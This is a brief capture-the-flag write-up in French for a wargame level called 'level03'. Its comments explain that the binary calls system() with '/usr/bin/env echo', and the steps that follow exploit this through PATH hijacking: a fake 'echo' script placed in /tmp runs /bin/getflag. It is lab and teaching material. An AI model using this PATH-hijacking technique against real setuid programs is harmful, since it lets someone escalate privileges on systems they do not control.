# ./level03
#   >exploit me
# en faisant un nm level03 on vois la presence d'un appel a system
# en faisant un strings level03 on trouve /usr/bin/env echo Exploit me
# on peu deduire que le code fais un appel a echo par la fonction system pour afficher exploit ne
# system est vulnerable car il parcours la variable $PATH et a la premiere occurence du programme trouve il l'execute.
# l'astuce consiste a mettre notre programme qui s'appel aussi echo en debut de liste mais celui ci sera en fait le programme getflag

echo '/bin/getflag' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
